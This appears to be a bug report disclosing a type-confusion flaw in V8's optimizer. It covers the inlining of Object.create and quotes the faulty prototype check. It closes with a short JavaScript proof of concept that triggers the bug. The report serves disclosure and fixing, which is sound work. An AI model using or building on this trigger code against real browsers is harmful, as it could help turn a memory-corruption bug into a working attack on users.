<a href="https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2" title="" class="" rel="nofollow">https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2</a>

According to the description, Object.create is supposed to be inlined only when the prototype given as the parameter is "null".

The following check has to guarantee it, but it can&#039;t guarantee it. Any receiver can get through the check, then Map::GetObjectCreateMap may transition the prototype, which may lead to type confusion.
  if (!prototype_const->IsNull(isolate()) && !prototype_const->IsJSReceiver()) {
    return NoChange();
  }
  instance_map = Map::GetObjectCreateMap(prototype_const);

PoC:
var object;
function opt() {
    opt[&#039;x&#039;] = 1.1;
    try {
        Object.create(object);
    } catch (e) {
    }

    for (let i = 0; i < 1000000; i++) {

    }
}

opt();
object = opt;
opt();
